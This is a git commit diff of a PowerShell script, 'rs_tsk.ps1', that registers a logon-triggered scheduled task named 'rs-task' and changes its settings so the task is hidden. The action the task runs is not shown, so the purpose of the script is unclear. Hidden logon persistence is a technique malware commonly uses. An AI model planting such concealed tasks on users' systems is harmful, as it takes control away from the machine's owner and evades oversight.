89d22d2e9dcd4c216e9b77b42b7223a790622c78
logan <loganmitchell2011@gmail.com>
2022-07-06 13:38:05 -0400

    testing

--- rs_tsk.ps1
+++ rs_tsk.ps1
@@ -11,7 +11,7 @@ if($taskExists) {
    $trigger = New-ScheduledTaskTrigger -AtLogOn;
    $principal = New-ScheduledTaskPrincipal -UserId (Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object -expand UserName);
    $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal;
-   $settings = New-ScheduledTaskSettingsSet -AsJob;
+   $settings = New-ScheduledTaskSettingsSet -Hidden $true;
    Register-ScheduledTask rs-task -InputObject $task -Settings $settings;
    Start-ScheduledTask -TaskName rs-task;
    #note so my dumbass doesnt forget how to get rid of scheduled task in powershell.
